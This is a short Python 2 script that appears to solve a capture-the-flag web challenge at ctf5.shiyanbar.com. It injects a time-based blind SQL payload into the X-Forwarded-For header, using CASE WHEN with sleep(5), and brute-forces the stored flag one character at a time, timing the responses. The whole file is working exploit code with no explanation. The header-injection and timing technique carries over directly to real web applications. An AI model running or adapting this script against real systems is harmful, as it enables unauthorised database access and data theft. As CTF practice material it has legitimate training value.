# -*- coding: utf-8 -*-

import requests
import time

payloads = 'abcdefghijklmnopqrstuvwxyz0123456789@_.{}-'  # mysql like不区分大小写

flag = ""
print 'Start to retrive flag:'
for i in range(32):
    for payload in payloads:
        starttime = time.time()
        url = "http://ctf5.shiyanbar.com/web/wonderkun/index.php"

        headers = {"Host": "ctf5.shiyanbar.com",
                   "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:44.0) Gecko/20100101 Firefox/44.0",
                   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                   "Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
                   "Accept-Encoding": "gzip, deflate",
                   "Cookie": "Hm_lvt_34d6f7353ab0915a4c582e4516dffbc3=1470994390,1470994954,1470995086,1471487815; Hm_cv_34d6f7353ab0915a4c582e4516dffbc3=1*visitor*67928%2CnickName%3Ayour",
                   "Connection": "keep-alive",
                   "X-FORWARDED-FOR": "127.0.0.1' and (SELECT * FROM (SELECT(case when ((select count(flag) from flag where flag like '" + flag + payload + "%')>0) then sleep(5) else sleep(0) end))lzRG) and '1'='1"
                   }

        res = requests.get(url, headers=headers)
        if time.time() - starttime > 5:
            starttime2 = time.time()
            res = requests.get(url, headers=headers)
            if time.time() - starttime > 5:
                flag += payload
                print '\n database is:', flag,
                break
        else:
            print '.',
print '\n[Done] current database is %s' % flag
